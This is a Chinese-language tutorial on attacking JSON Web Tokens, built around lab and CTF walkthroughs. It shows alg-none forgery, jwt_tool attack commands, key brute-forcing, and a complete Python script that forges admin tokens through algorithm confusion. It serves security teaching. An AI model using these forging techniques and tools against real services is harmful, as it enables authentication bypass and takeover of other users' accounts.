# JWT渗透与防御

```
前言:JWT相关漏洞对于渗透测试人员而言可能是一种非常吸引人的攻击途径，因为它们不仅是让你获得无限访问权限的关键，而且还被视为隐藏了通往以下特权的途径：特权升级，信息泄露，SQLi，XSS，SSRF，RCE，LFI等，在测试JWT时，通过对目标服务的Web请求中使用的Token进行读取，篡改和签名。
JWT漏洞介绍
什么是身份认证?
身份认证（Authentication)又称“身份验证”、“鉴权”，是指通过一定的手段，完成对用户身份的确认。Web服务目前认证的方式有：session++cookie、jwt、token。
Session认证机制需要配合Cookie才能实现。由于 Cookie默认不支持跨域访问 ，所以，当涉及到前端跨域请求后端接口的时候，需要做很多额外的配置，才能实现跨域Session认证。
```

```
JWT(英文全称：JSON Web Token)是一个开放标准（RFC 7519），用于在双方之间安全地表示声明。一种无状态的认证机制,通常用于授权和信息交换。是目前 最流行的跨域认证解决方案。
如下图，图中的1对应的是Header部分的编码后的样子，2对应的是部分编码后的样子，3对应的是Signature编码后的样子。
```

![image-20241116203849252](JWT渗透与防御/image-20241116203849252.png)	

```
JWT的安全性
从安全性的角度来看，至少存在两个潜在的问题。
1、缺乏机密性-我们能够轻松解码有效载荷payload（和报头header）。
2、用户插入另一个操作（例如删除）并绕过授权。
```

```
案列演示之Leaky_JWT
靶场：https://authlab.digi.ninja/Leaky_JWT
```

```
如图这里因为是靶场所以直接把JWT给爆露出来，实战中我们可以去抓包，如果抓到的数据包中有类似这样的JWT认证，那我们就可以直接拿去解密了。我们拿到的数据是这样的：
```

![image-20241117234440190](JWT渗透与防御/image-20241117234440190.png)	

```
这是一个标准的JWT认证的格式，之前说了JWT格式分为三个部分，分别为Header、Payload、Signature，每个部分之间又以“.”号分割。
他这里的JWT认证是经过加密的，所以我们这里先要拿到base64解密网站去解密一下
解密后发现是使用HS256进行加密签名。HS256是对称加密，所以是使用同样的密钥进行加解密。
```

![image-20241117234841921](JWT渗透与防御/image-20241117234841921.png)		

```
感觉password有32位像是md5加密，拿去解密
```

![image-20241117234726282](JWT渗透与防御/image-20241117234726282.png)	

```
于是使用账号joe,密码Password1即可登录成功。
```

![image-20241117234907363](JWT渗透与防御/image-20241117234907363.png)	

```
总结，进行JWT授权登录，需要保证JWT令牌的payload部分没有携带敏感数据。
JWT漏洞具体的实现方式：
1、算法为none
2、算法修改
3、签名失败问题，比如任意修改JWT的内容，却没有进行验证，那可能接受任意修改的JWT
4、暴力破解
5、密钥泄露
6、令牌刷新
```

```
攻击思路:
首先找到需要JWT鉴权后才能访问的页面，如个人资料页面，将该请求包重放测试： 
（1）未授权访问：删除Token后仍然可以正常响应对应页面
（2）敏感信息泄露：通过JWt.io解密出Payload后查看其中是否包含敏感信息，如弱加密的密码等
（3）破解密钥+越权访问：通过JWT.io解密出Payload部分内容，通过空加密算法或密钥爆破等方式实现重新签发Token并修改Payload部分内容，重放请求包，观察响应包是否能够越权查看其他用户资料
（4）检查Token时效性：解密查看payload中是否有exp字段键值对（Token过期时间），等待过期时间后再次使用Token发送请求，若正常响应则存在Token不过期
（5）通过页面回显进行探测：如修改Payload中键值对后页面报错信息是否存在注入，payload中kid字段的目录遍历问题与sql注入问题
```

```
案列演示之JWT None Algorithm
我们再来看一下有关于JWT签名算法的一个关卡
```

![image-20241118000217337](JWT渗透与防御/image-20241118000217337.png)	

```
打开bp,做好提前准备，安装好JSON Web Tokens和JSON Web Token Attacker,不过这里版本较低显示无法安装，我就不安装了。这两个工具可以在抓包的过程中自动解密JWT令牌的内容。
```

![image-20241118000608923](JWT渗透与防御/image-20241118000608923.png)		

```
抓包时点击Validate Token
```

![image-20241118000919615](JWT渗透与防御/image-20241118000919615.png)	

```
抓包获得一个字符串，有三个点，那大概率就是JWT，用base64解密即可。
```

![image-20241118001012194](JWT渗透与防御/image-20241118001012194.png)	

![image-20241118001048707](JWT渗透与防御/image-20241118001048707.png)	

```
我们将其加密方式修改为None，并重新base64编码，替换掉JWT的header部分。
```

![image-20241118001340392](JWT渗透与防御/image-20241118001340392.png)	

```
假设有hsw这个用户，设置base64加密，替换掉payload部分，来伪造其他用户的token授权。由于加密方式为none,那第三部分的签名可以设置为空。
```

![image-20241118001442748](JWT渗透与防御/image-20241118001442748.png)	

```
替换后放入repeater重发器，发现就伪造了hsw用户进行登录。
```

![image-20241118001609501](JWT渗透与防御/image-20241118001609501.png)	

## JWT工具利用

```
JWT漏洞工具的利用
JWT利用工具介绍
1.jwt_tool（git clone https://github.com/ticarpi/jwt_tool）可以用来验证、伪造和破解JWT令牌。
2.jwt-cracker,该工具仅限于单一的签名算法(HS256) ，如果提供了不同的签名算法，则无法进行操作, https://github.com/lmammino/jwt-cracker
3.c-jwt-cracker同样是暴力破解 JWT 私钥的工具。 https://github.com/brendan-rius/c-jwt-cracker
```

```
kali下JWT_tool安装
git clone https://github.com/ticarpi/jwt_tool
```

![image-20241118002433185](JWT渗透与防御/image-20241118002433185.png)	

```
设置成python3的环境。
```

![image-20241118002454064](JWT渗透与防御/image-20241118002454064.png)	

```
安装需要的依赖包。
pip install pycryptodomex
```

![image-20241118002526898](JWT渗透与防御/image-20241118002526898.png)	

```
使用python进行JWT内容的解密，可以直接解密出header和paylaod.
python jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoicm9iaW4iLCJsZXZlbCI6InVzZXIifQ.oYPuxIPnm6lYx3Zx_8zaMGVw7Np5nZtgJVnaMqlZcOQ
```

![image-20241118002907185](JWT渗透与防御/image-20241118002907185.png)	

```
可以使用jwt_common.txt这个密钥密码本进行爆破密钥。
python jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoicm9iaW4iLCJsZXZlbCI6InVzZXIifQ.oYPuxIPnm6lYx3Zx_8zaMGVw7Np5nZtgJVnaMqlZcOQ  -C  -d jwt-common.txt
但是很明显这里没有爆破出来密钥。
```

![image-20241118131958581](JWT渗透与防御/image-20241118131958581.png)	

```
1.签名算法可被修改为none(CVE-2015-9235)
使用jwt_tool进行攻击（该工具适用于不改变原有payload的数据的基础上而没有签名算法获得的token),使用这个漏洞模块可以将原本的加密的算法修改为None，然后我们就可以直接去执行一些越权修改payload等操作。
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoicm9iaW4iLCJsZXZlbCI6InVzZXIifQ.oYPuxIPnm6lYx3Zx_8zaMGVw7Np5nZtgJVnaMqlZcOQ  -X a
运行之后能得到新的JWT加密字符。
```

![image-20241118003151218](JWT渗透与防御/image-20241118003151218.png)	

```
使用jwt_tool进行解密查看
python jwt_tool.py eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoicm9iaW4iLCJsZXZlbCI6InVzZXIifQ.
```

![image-20241118003246037](JWT渗透与防御/image-20241118003246037.png)	

```
2、JWKS公钥 注入 ——伪造密钥(CVE-2018-0114)
漏洞描述:攻击者可以将 JWT 的签名算法从非对称算法（如 RS256）修改为对称算法（如 HS256）。系统在验证时错误地使用公钥（本应用于非对称算法）作为对称算法的密钥，从而允许攻击者伪造签名。因为公钥是已知的，但由于系统的疏忽，导致可以修改使用HS256进行签名，那么对于对称算法而言，必然也就能解决签名问题，从而实现任意授权。

jwk是header里的一个参数，用于指出密钥，存在被伪造的风险。攻击者可以通过以下方法来伪造JWT：删除原始签名，向标头添加新的公钥，然后使用与该公钥关联的私钥进行签名。
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoicm9iaW4iLCJsZXZlbCI6InVzZXIifQ.oYPuxIPnm6lYx3Zx_8zaMGVw7Np5nZtgJVnaMqlZcOQ -X i
```

![image-20241118004051753](JWT渗透与防御/image-20241118004051753.png)	

```
进行解密查看。
python3 jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJSU0EiLCJraWQiOiJqd3RfdG9vbCIsInVzZSI6InNpZyIsImUiOiJBUUFCIiwibiI6InRxU2MzT0QzYXZRREdwX24wUS1xMVRZT2dIY05wVzBmTHZIQ2RkbnMyZzRHTTN4aFVGaWg5UDF1aGQ0UDhCMUdfYmtwbUJ3RGgyeXRwYldpMjdKcWR0YmpJWHdGLXdyUURMWmsycWx1d1MtQm9FQTVWLVFTc0ZaN1RUZmh2NVNabk15OGJxWGZOa0VhT3VSa21CYVVGVUJvaHJMUGlyZXdFVFVYWXk0RzUxTlZ2dUZFNXFMMzEtdWNjMUliQ29XVVBRdFBUS0tBcTV0NnhleW5rVUtXMGZRWkFSOFcxT3pMelMxWTdnWXdqeXVfbnI5QlV0bHJpTDZ4RzlXZzJVcE9fTFF2MFlDTnF5M1dNdTB3c2JqeGd0NFdYVERqR0FtbTdzck9oZVV2ZTUtREk0ZnZJTWpGWEdPTW1jQW5CTGpoemhjTDk0RnZIWEdUcW5UdWZPcjF4dyJ9fQ.eyJ1c2VyIjoicm9iaW4iLCJsZXZlbCI6InVzZXIifQ.b0sU7fUa4bxcwXtMlcQTCQvw0oajuT47kv-PWeUWBIYe8Natyx8kHlSCyQWTylX3P_UICN282x-AnNAeutF4O3FjZeIsZIPwiGqkLyZdgNwRgv6plaLpfqdKOqRj8O6zMA4YHSgKWNCVKWcnVDH_wdocnNmG2RVsPGOv7Cyj0sL6hu37xxg1yLvL4sGtU9-malL5BEG7aevAP_NHpVM474EUjLJ2aF-O29uejr95j0LvsxAUWT9Ir6kR_B5EVCS2n-TRpi3VRg0JgLa6N_gySKm5MNoarmPZsNdda-zAN64pFN7f0BXKoJ87iqQQR-8eY1yyKr7vKE41ktfJPI_3JQ
```

![image-20241118004253889](JWT渗透与防御/image-20241118004253889.png)	

```
3、空签名(CVE-2020-28042)
这个漏洞用于那种签名失败问题。使得无签名也能授权成功。
从令牌末尾删除签名.
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoicm9iaW4iLCJsZXZlbCI6InVzZXIifQ.oYPuxIPnm6lYx3Zx_8zaMGVw7Np5nZtgJVnaMqlZcOQ -X n
```

![image-20241118010710037](JWT渗透与防御/image-20241118010710037.png)	

```
解密查看一下。
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoicm9iaW4iLCJsZXZlbCI6InVzZXIifQ.
```

![image-20241118011910544](JWT渗透与防御/image-20241118011910544.png)	

```
jwt-cracker
该工具仅限于单一的签名算法(HS256) ，如果提供了不同的签名算法，则无法进行操作。用法就是命令后面直接加上JWT数据，他会一直给你进行爆破，直到爆破成功。
首先安装jwt-cracker,如果clone不了，就直接去这个链接下载，然后把目录放到kali下。
git clone https://github.com/lmammino/jwt-cracker

可以使用jwt-cracker对JWT的内容进行密钥的爆破
```

![image-20241118131351188](JWT渗透与防御/image-20241118131351188.png)	

![image-20241118131423896](JWT渗透与防御/image-20241118131423896.png)	

## CTF靶场演示

### 敏感信息泄露

![image-20241118134900209](JWT渗透与防御/image-20241118134900209.png)	

```
进入靶场后，随便使用一个账号密码登陆就是这样。
```

![image-20241118135039887](JWT渗透与防御/image-20241118135039887.png)	

```
刷新该网页抓包。发现token是三个.组成，很明显大概率是JWT格式，于是拿去解密。
```

![image-20241118135119405](JWT渗透与防御/image-20241118135119405.png)	

```
解密内容。
python jwt_tool.py eyJBRyI6IjEzZTdmMGJlMzI0M2VhN30iLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJGTCI6ImN0Zmh1Yns4MjVkZTM0OTIifQ.ouFXQ56K6Aeb0jY4wbZvi1qO9HCxDy4gFEYJDI8NTrI
```

![image-20241118135231960](JWT渗透与防御/image-20241118135231960.png)	

```
于是找到flag，进行拼接即可。
```

![image-20241118135247756](JWT渗透与防御/image-20241118135247756.png)	

### 无签名

```
紧接着开始下一个关卡。
```

![image-20241118135528547](JWT渗透与防御/image-20241118135528547.png)	

```
刚来随便使用一个账户进行登录。
```

![image-20241118135611474](JWT渗透与防御/image-20241118135611474.png)	

```
由于提示是guest权限，所以需要变成admin才能获得flag.
```

![image-20241118135634333](JWT渗透与防御/image-20241118135634333.png)	

```
于是bp抓包查看一下。发现有token,使用base64进行解密查看。
```

![image-20241118135917159](JWT渗透与防御/image-20241118135917159.png)	

![image-20241118140002916](JWT渗透与防御/image-20241118140002916.png)	

```
由于该关卡是无签名，所以尝试把alg设置none,然后base64加密。替换掉原先JWT的header部分。
```

![image-20241118141440484](JWT渗透与防御/image-20241118141440484.png)		

```
把权限改成admin，替换payload部分，用于伪造admin权限。最后注意签名部分为空，因为加密算法使用none。
```

![image-20241118140307890](JWT渗透与防御/image-20241118140307890.png)	

```
放到重发器点击send即可获得flag。
```

![image-20241118141248003](JWT渗透与防御/image-20241118141248003.png)	

### 修改签名算法

![image-20241118144405741](JWT渗透与防御/image-20241118144405741.png)	

```
点击下载这个公钥。
```

![image-20241118144454228](JWT渗透与防御/image-20241118144454228.png)	

```
随便使用一个账号登录。并将公钥下载下来。
```

![image-20241118144556751](JWT渗透与防御/image-20241118144556751.png)	

```
通过base64解码，获得用户名和权限名。
```

![image-20241118144704414](JWT渗透与防御/image-20241118144704414.png)	

```
将内容复制下来。创建一个publickey.pem
```

![image-20241118144813245](JWT渗透与防御/image-20241118144813245.png)	

```python
然后使用py脚本,读取这个公钥,并伪造加密方式为HS256，由于是对称加密，那么就可以根据这个公钥伪造签名，从而获取到flag.
# coding=GBK
import hmac
import hashlib
import base64

file = open('publickey.pem')    #需要将文中的publickey下载	与脚本同目录
key = file.read()

# Paste your header and payload here
header = '{"typ": "JWT", "alg": "HS256"}'
payload = '{"username": "admin", "role": "admin"}'

# Creating encoded header
encodeHBytes = base64.urlsafe_b64encode(header.encode("utf-8"))
encodeHeader = str(encodeHBytes, "utf-8").rstrip("=")

# Creating encoded payload
encodePBytes = base64.urlsafe_b64encode(payload.encode("utf-8"))
encodePayload = str(encodePBytes, "utf-8").rstrip("=")

# Concatenating header and payload
token = (encodeHeader + "." + encodePayload)

# Creating signature
sig = base64.urlsafe_b64encode(hmac.new(bytes(key, "UTF-8"), token.encode("utf-8"), hashlib.sha256).digest()).decode("UTF-8").rstrip("=")

print(token + "." + sig)
```

```
运行出来得到伪造的JWT，那么bp抓包传入即可获得flag.
```

![image-20241118152350334](JWT渗透与防御/image-20241118152350334.png)		

### 弱密钥

```
如果JWT采用对称加密算法，并且密钥的强度较弱的话，攻击者可以直接通过蛮力攻击方式来破解密钥。尝试获取flag。
```

![image-20241118161103394](JWT渗透与防御/image-20241118161103394.png)	

```
下载这个cracker工具，用于爆破JWT的密钥使用的。
https://github.com/brendan-rius/c-jwt-cracker
下载好指定的目录后，并下载指定的库。
apt-get install libssl-dev
然后使用make进行编译
```

![image-20241118161509514](JWT渗透与防御/image-20241118161509514.png)	

```
打开靶场随便输入一个用户进行登录即可。
```

![image-20241118161557781](JWT渗透与防御/image-20241118161557781.png)	

```
对这个页面进行刷新，并使用bp抓包
```

![image-20241118161630568](JWT渗透与防御/image-20241118161630568.png)	

```
获得到JWT的令牌。
```

![image-20241118161712830](JWT渗透与防御/image-20241118161712830.png)	

```
使用 c-jwt-cracker 工具爆破密钥，爆破出密钥是yauh
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImhzdyIsInBhc3N3b3JkIjoiMTIzNDU2Iiwicm9sZSI6Imd1ZXN0In0.tDdZBAWOh-02zoSwmoY3jA0L5LmGE4Jps4hEnQGRxQM
```

![image-20241118161848965](JWT渗透与防御/image-20241118161848965.png)	

```
再来到网站https://jwt.io/
把JWT放到左边，右边改成 admin 和密钥“yauh”,伪造成管理员，这样会根据密钥重新伪造一个新的签名。
```

![image-20241118162437787](JWT渗透与防御/image-20241118162437787.png)		

```
经过repeater重新发送，即可伪造授权成功，获得flag.
```

![image-20241118162401931](JWT渗透与防御/image-20241118162401931.png)	











